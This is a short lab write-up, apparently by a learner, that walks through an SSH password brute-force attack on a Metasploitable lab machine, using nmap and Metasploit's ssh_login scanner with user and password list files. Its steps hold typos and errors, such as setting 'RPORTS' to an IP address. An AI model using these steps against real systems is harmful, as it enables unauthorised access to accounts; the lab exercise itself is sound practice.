##### Bruteforce-demo

##### _This hands on lab was walk on to display my current knowledge and put it into practical by stimulating a real word brute force attack and understanding how it works from a hackers point of view. As a pen tester expliotation is the next step after reconssinace and information garthering._

---

##### Tools Used
- Nmap
- Kali
- Metaspliotable OS
- msfconsole
---

##### Steps

##### 1. install metaspliotable on your kali

```bash
sudo apt update
sudo apt install metasploit-framework -y
```
---

##### 2. Access msfconsole

```bash
msfconsole
```
---

##### 3. Run basic nmap command to view open ports

```bash
nmap 192.168.1.4
```
My port 22/tcp (ssh) is opened so we would be exploiting that.

---

##### 4. Access scan ssh on msfconsole

```bash
msf > search ssh
```
---

##### 5. Access the auxiliary Scanner for ssh

```bash
msf > use auxiliary/scanner/ssh/ssh_login
```
---

##### 6. Search Options to understand the requirements and set them up

```bash
msf > show options
```
---

##### 7. Set the PASS_FILE, USER_FILE, RHOSTS, BRUTEFORCE_SPEED AND VERBOSE, as communicated under options

```bash
msf > set RPORTS 192.168.1.4
msf > set VERBOSE true
msf > set USER_FILE "file path/text file"
msf > set PASS_FILE "file path/text file"
```
#### Then run

```bash
msf > run
```
---

